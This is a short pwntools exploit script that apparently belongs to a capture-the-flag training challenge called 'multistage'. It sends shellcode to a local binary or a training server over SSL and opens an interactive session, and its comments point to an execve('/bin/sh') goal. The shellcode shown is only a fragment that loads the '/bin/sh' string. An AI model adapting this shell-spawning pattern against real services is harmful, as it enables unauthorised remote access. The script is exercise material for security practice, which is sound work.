from pwn import *

COMMANDS = """
"""
shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00"




#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./multistage" , gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./multistage")
p.send(shellcode)
p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f
